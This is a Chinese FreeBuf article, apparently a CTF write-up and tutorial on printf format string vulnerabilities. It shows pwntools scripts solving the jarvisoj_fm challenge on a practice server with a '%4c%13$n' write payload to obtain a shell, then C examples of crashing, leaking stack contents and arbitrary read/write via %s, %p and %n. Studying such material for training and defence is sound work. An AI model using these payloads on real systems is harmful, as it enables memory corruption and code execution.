---
title: 格式化字符串漏洞分析
url: https://www.freebuf.com/vuls/354287.html
source: FreeBuf网络安全行业门户
date: 2023-02-02
fetch_date: 2025-10-04T05:29:20.918955
---

# 格式化字符串漏洞分析

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

格式化字符串漏洞分析

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

格式化字符串漏洞分析

2023-02-28 01:34:30

所属地 海外

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## jarvisoj\_fm

使用checksec进行查询发现并未做安全保护意识使用IDA32进行反编译得到如下伪代码

![1675233313_63da0821e16ddc6ae34e4.png!small?1675233315472](https://image.3001.net/images/20230201/1675233313_63da0821e16ddc6ae34e4.png!small?1675233315472)
在该程序中只需要判断x=4即可获得系统shell
查看发现x的值为3,。同时得到x的地址为0x804A02C
![](https://image.3001.net/images/20230228/1677519245_63fce98d393238e242a72.png!small)
在printf函数中的参数可控 于是可能存在格式化字符漏洞，利用字符串漏洞重写x的值。
输入的字符串会存储进入栈内，然后printf函数使用输入的内容作为格式化字符串进行控制输出。
输入多个%p打印栈上的内容判断输入的数据在栈上离栈顶的偏移。
构造如下AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
from pwn import \*

p=remote("node4.buuoj.cn",27668)
adrr=p32(0x0804A02C)
PAYLOAD=b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"
p.sendline(PAYLOAD)

p.interactive()

可以计算该偏移量为11
设计payload如下：
“%4c%n”,65,0x0804A02C //打印4个字符，并将输出的字符数4根据%n格式控制字符串写入0x0804A02C

由于输入的字符串需要存入栈中如下
故在printf函数提取参数时构造的payload如下
%4c%13$n0x0804A02C //其中%13$n为将默认的第13个格式化字符串的内容作为格式控制字符串%n的参数。

构造payload
from pwn import \*

p=remote("node4.buuoj.cn",27668)
adrr=p32(0x0804A02C)
payload=b"%4c%13$n"
p.sendline(payload+adrr)

p.interactive()

flag{0b8c0e45-ff89-49f3-b6b5-d3edb10d8ec5}

## 格式化字符串漏洞

### 漏洞原理

格式化字符串是一种很常见的漏洞，其产生根源是printf函数设计的缺陷，即printf()函数并不能确定数据参数arg1,arg2…究竟在什么地方结束，也就是说，它不知道参数的个数。它只会根据format中的打印格式的数目依次打印堆栈中参数format后面地址的内容
格式字符串漏洞发生的条件就是格式字符串要求的参数和实际提供的参数不匹配

printf("格式化字符串1，格式化字符串2",参数1，参数2...)
%d - 十进制 - 打印十进制整数
%s - 字符串 - 打印参数地址处的字符串
%x,%X- 十六进制 - 打印十六进制数
%o - 八进制 -打印八进制整形
%c - 字符 - 打印字符
%p - 指针 - 打印指针地址 即void \*
%n - 到目前为止所写的字符数
%<正整数n>c 打印宽度为n的字符串（打印长度为n）

## 漏洞利用原理

利用格式化字符串与参数的数量不匹配时编译依旧能够通过，并且当满足格式化字符串的格式要求时按格式化字符串定义对栈上空间内容的控制以至于控制内存空间，从而控制程序。
特别要注意的是%n这个格式化字符串，它的功能是将%n之前打印出来的字符个数（四字节）写入参数地址处（赋值给一个变量）。
32位的程序，%n取的就是4字节指针，
64位取的就是8字节指针。
%hn 写入两个字节
%hhn 写入一个字节
例：
printf("%1234c%hhn",65,0x41414141);
因为1234=0x4D2，所以会往地址0x41414141处写入0x4D2（1字节）
内存结构
Win32系统中，进程使用的内存按功能可以分4个区域

栈区：该区域内存由系统自动分配，用于动态存储函数之间的调用关系
堆区：该区域内存由进程利用相关函数或运算符动态申请，用完后释放并归还给堆区。例如，C语言中用malloc/free函数，C++语言中用new/delete运算符申请的空间就在堆区。
代码区：存放程序汇编后的机器代码和只读数据
数据区：用于存储全局变量和静态变量

## 漏洞可能造成影响

### 程序崩溃

当程序存在格式化字符串漏洞时，通过大量的%s可引起程序崩溃，造成拒绝服务的结果。
Printf（）函数的格式化用法如下
printf("格式化字符串1，格式化字符串2",参数1，参数2...)
其中部分输出控制符如下
%d - 十进制 - 打印十进制整数
%s - 字符串 - 打印参数地址处的字符串
%x,%X- 十六进制 - 打印十六进制数
%o - 八进制 -打印八进制整形
%c - 字符 - 打印字符
%p - 指针 - 打印指针地址 即void \*
%n - 到目前为止所写的字符数
%<正整数n>c 打印宽度为n的字符串（打印长度为n）

在函数中当格式化字符串个数与参数个数不相等时，超出的部分将会按照输出控制的控制字符串的含义执行数据，其中是将栈顶当做第一个超出的输出控制符对应的参数，依次从栈顶向栈低对应超出的参数

#include "stdafx.h"

int main(int argc, char\* argv[])
{
int a=1;
int b=2;
printf("%s%s");
return 0;
}

#include "stdafx.h"

int main(int argc, char\* argv[])
{
int a=1;
int b=2;
printf("%s%s%s%s");
return 0;
}

### 查看任意地址的内容

在上述使程序崩溃的过程中我们使用了%s来打印栈空间内容作为地址的字符串，当控制栈空间上的内容为指向一个我们想要去查看内容的地址时，即可用%s进行查看。
如下

#include "stdafx.h"

int main(int argc, char\* argv[])
{
int a=0x0012ff74; //该值为字符串变量x在栈上的地址
int b=2;
char x='h';
printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s");
return 0;
}
通过控制%s指向我们需要打印的内存空间的地址即可将其进行打印出来。其中重要的是找到存储任意内存地址在栈上与栈顶的偏移数量。确定偏移可以通过下方的泄漏栈空间内容的方法进行确定。

### 泄漏栈空间内容

Eg:

#include "stdafx.h"

int main(int argc, char\* argv[])
{
int a=1;
int b=2;
printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",a,b);
return 0;
}

在printf函数中，当参数个数与格式化字符串不匹配时，将会从栈顶位置向栈底开始打印，将栈内的内容按照格式化字符串的要求打印出来，%p即是打印指针的地址，当存在参数a,和b时，即是打印a,和b所指向的空间的内容，超出部分默认将栈顶当做参数，打印其指向的栈顶地址的内容。

通过printf函数中控制%p的个数即可以泄漏栈的全部内容。

### 向任意地址写内容

在printf函数中我们知道存在一个格式化字符串会向内存中写入数据，即是使用%n
它的功能是将%n之前打印出来的字符个数（四字节）写入参数地址处（赋值给一个变量）。在32位程序中需要的这个地址即是32位，在64位中地址需要为64位。

#include "stdafx.h"

int main(int argc, char\* argv[])
{
int a=0x0012ff74;
int b=2;
char x='h';
printf("%10c%n",x,0x0012ff70);
return 0;

![图片描述](https://image.3001.net/images/20230201/1675233777_63da09f11a44e1be416d1.png!small)

# 漏洞分析 # CTF

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

jarvisoj\_fm

格式化字符串漏洞

* 漏洞原理

漏洞利用原理

漏洞可能造成影响

* 程序崩溃
* 查看任意地址的内容
* 泄漏栈空间内容
* 向任意地址写内容

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)